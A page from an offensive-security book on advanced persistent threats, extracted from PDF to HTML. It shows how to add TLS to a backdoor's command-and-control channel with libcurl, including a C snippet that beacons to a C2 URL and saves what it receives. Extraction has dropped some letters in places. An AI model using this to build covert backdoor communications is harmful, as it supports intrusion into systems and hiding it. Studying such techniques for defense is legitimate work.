<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf1ad" class="pf w2 h2" data-page-no="1ad"><div class="pc pc1ad w2 h2"><div class="t m0 xbe h10 y83 ff1 fs9 fc0 sc0 lsa ws0">406<span class="_ _d"> </span><span class="ff2 fs2 ls8">Advanced Persistent Threat Hacking<span class="_ _1e"/> </span></div><div class="t m0 x4 hd y11c ff4 fs7 fc0 sc0 ls0 ws0">In this case, you can see that we not only react to the two hard-coded comments, </div><div class="t m0 x3 hd y11d ff4 fs7 fc0 sc0 ls0 ws0">but also to a specic sentence as a third command. Using this same technique, we </div><div class="t m0 x3 hd y11e ff4 fs7 fc0 sc0 ls0 ws0">can ultimately use any te<span class="_ _0"/>xt we want to represent a command from the C2 serv<span class="_ _0"/>er<span class="_ _0"/>, not </div><div class="t m0 x3 hd y15c ff4 fs7 fc0 sc0 ls0 ws0">only HTML comments!</div><div class="t m0 x3 h7 y2687 ff1 fs3 fc0 sc0 ls0 ws0">Command and Control HTTPS</div><div class="t m0 x3 hd y2688 ff4 fs7 fc0 sc0 ls0 ws0">Adding HTTPS functionality to our backdoor is an extremely easy task with the </div><div class="t m0 x3 hd y1d37 ff4 fs7 fc0 sc0 ls0 ws0">cURL library<span class="_ _2"/>. <span class="_ _0"/>All we really need to do is include the openssl library to add support </div><div class="t m0 x3 hd y2689 ff4 fs7 fc0 sc0 ls0 ws0">for SSL and TLS.</div><div class="t m0 x4 hd y268a ff4 fs7 fc0 sc0 ls0 ws0">Once openssl is installed and congured, we create the URL request just as we </div><div class="t m0 x3 hd y268b ff4 fs7 fc0 sc0 ls0 ws0">normally would, with a fe<span class="_ _0"/>w more options. The SSL-related options we’<span class="_ _0"/>ll congure </div><div class="t m0 x3 hd y1af1 ff4 fs7 fc0 sc0 ls0 ws0">are as follo<span class="_ _0"/>ws:</div><div class="t m0 x16 h1f y268c ffb fse fc0 sc0 ls0 ws0">c</div><div class="t m0 x1 h2c y268d ff3 fs7 fc0 sc0 ls0 ws0">CURLOPT_SSL_VERIFYPEER<span class="_ _41"> </span><span class="ff4">The remote certicate will be veried as </span></div><div class="t m0 x1 hd y268e ff4 fs7 fc0 sc0 ls0 ws0">being signed by a “v<span class="_ _0"/>alid CA”—that is, <span class="ff5">not</span> self-signed.</div><div class="t m0 x16 h1f y268f ffb fse fc0 sc0 ls0 ws0">c</div><div class="t m0 x1 h2c y2690 ff3 fs7 fc0 sc0 ls0 ws0">CURLOPT_SSL_VERIFYHOST<span class="_ _a"> </span><span class="ff4">If congured, it will only accept the </span></div><div class="t m0 x1 hd y2691 ff4 fs7 fc0 sc0 ls0 ws0">certicate if it matches the hostname that we are connecting to.</div><div class="t m0 x16 h1f y2692 ffb fse fc0 sc0 ls0 ws0">c</div><div class="t m0 x1 h2c y2693 ff3 fs7 fc0 sc0 ls0 ws0">CURLOPT_CAINFO<span class="_ _a"> </span><span class="ff4">Congures a certicate authority (CA) certicate </span></div><div class="t m0 x1 hd y2694 ff4 fs7 fc0 sc0 ls0 ws0">that the remote server certicate must be signed by<span class="_ _3"/>. If the server’<span class="_ _0"/>s certicate </div><div class="t m0 x1 hd y2695 ff4 fs7 fc0 sc0 ls0 ws0">was not signed by our CA certicate, the connection will be rejected, thus </div><div class="t m0 x1 hd y2696 ff4 fs7 fc0 sc0 ls0 ws0">pre<span class="_ _0"/>venting a potential SSL man-in-the-middle attack. <span class="_ _0"/>T<span class="_ _2"/>o use this, you must </div><div class="t m0 x1 hd y2697 ff4 fs7 fc0 sc0 ls0 ws0">hav<span class="_ _0"/>e the CURLOPT_SSL_VERIFYPEER option enabled.</div><div class="t m0 x4 hd y2698 ff4 fs7 fc0 sc0 ls0 ws0">Using an example similar to our pre<span class="_ _0"/>vious heartbeat request, the follo<span class="_ _0"/>wing is a </div><div class="t m0 x3 hd y2699 ff4 fs7 fc0 sc0 ls0 ws0">snippet of what our request would no<span class="_ _0"/>w look like:</div><div class="t m0 x3 h40 y269a fff fs5 fc0 sc0 ls0 ws0">#define CA_CERT_FILE "server.cer"</div><div class="t m0 x3 h40 y269b fff fs5 fc0 sc0 ls0 ws0">// Certificate must be in PEM format</div><div class="t m0 x3 h40 y269c fff fs5 fc0 sc0 ls0 ws0">curl_easy_setopt(curl, CURLOPT_URL, "https://apthacker.com/heartbeat.php");</div><div class="t m0 x3 h40 y269d fff fs5 fc0 sc0 ls0 ws0">curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 1L);</div><div class="t m0 x3 h40 y269e fff fs5 fc0 sc0 ls0 ws0">curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback); </div><div class="t m0 x3 h40 y269f fff fs5 fc0 sc0 ls0 ws0">curl_easy_setopt(curl, CURLOPT_WRITEDATA, outFile);</div><div class="t m0 x3 h40 y26a0 fff fs5 fc0 sc0 ls0 ws0">curl_easy_setopt(curl, CURLOPT_CAINFO, CA_CERT_FILE);</div><div class="t m0 x3 h40 y26a1 fff fs5 fc0 sc0 ls0 ws0">res = curl_easy_perform(curl);</div><div class="t m0 x3 h40 y26a2 fff fs5 fc0 sc0 ls0 ws0">curl_easy_cleanup(curl);</div><div class="t m0 x4 hd y26a3 ff4 fs7 fc0 sc0 ls0 ws0">That’<span class="_ _2"/>s it; that is how easy it is to add SSL capabilities to our backdoor<span class="_ _2"/>. Not only </div><div class="t m0 x3 hd y26a4 ff4 fs7 fc0 sc0 ls0 ws0">can this be used for all of our C2 communications, but also an<span class="_ _0"/>y communications to </div><div class="t m0 x3 hd y26a5 ff4 fs7 fc0 sc0 ls0 ws0">do<span class="_ _0"/>wnload les.</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>